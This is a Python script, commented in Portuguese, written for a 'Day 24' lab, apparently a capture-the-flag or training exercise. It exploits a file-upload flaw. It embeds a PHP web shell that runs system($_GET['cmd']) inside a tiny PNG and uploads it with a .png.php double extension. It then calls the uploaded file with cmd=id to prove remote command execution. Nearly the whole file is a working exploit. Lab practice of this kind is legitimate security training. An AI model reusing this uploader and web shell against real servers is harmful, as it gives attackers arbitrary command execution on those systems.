#!/usr/bin/env python3
"""Envia uma imagem PNG com código PHP ao laboratório do Dia 24."""

import argparse
import base64
import io
from urllib.parse import urljoin

import requests
from PIL import Image


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("base_url", help="URL do segundo site, por exemplo http://<IP>:<PORTA>")
    parser.add_argument("--username", help="Usuário de uma conta criada no laboratório")
    parser.add_argument("--password", help="Senha dessa conta")
    parser.add_argument("--name", default="probe.png.php", help="Nome do arquivo enviado")
    parser.add_argument("--upload-path", default="/api/upload")
    parser.add_argument("--public-path", default="/grid/", help="Diretório público encontrado na enumeração")
    args = parser.parse_args()

    if bool(args.username) != bool(args.password):
        parser.error("Informe --username e --password juntos")
    if not args.name.endswith(".png.php") or "/" in args.name:
        parser.error("O nome deve terminar em .png.php e não pode conter barras")

    base = args.base_url.rstrip("/") + "/"
    session = requests.Session()
    if args.username:
        login = session.post(
            urljoin(base, "/api/login"),
            json={"username": args.username, "password": args.password},
            timeout=15,
        )
        login.raise_for_status()
        print(f"Login: HTTP {login.status_code}")

    image = io.BytesIO()
    Image.new("RGB", (1, 1), "red").save(image, format="PNG")
    php = b"\n<?php system($_GET['cmd'] ?? 'id'); ?>"
    data_url = "data:image/png;base64," + base64.b64encode(image.getvalue() + php).decode("ascii")

    upload = session.post(
        urljoin(base, args.upload_path),
        json={"name": args.name, "file": data_url},
        timeout=20,
    )
    print(f"Upload: HTTP {upload.status_code} - {upload.text[:400]}")
    upload.raise_for_status()

    probe_url = urljoin(base, args.public_path.rstrip("/") + "/" + args.name)
    probe = session.get(probe_url, params={"cmd": "id"}, timeout=15)
    print(f"Prova em {probe.url}: HTTP {probe.status_code} - {probe.text[:400]}")


if __name__ == "__main__":
    main()
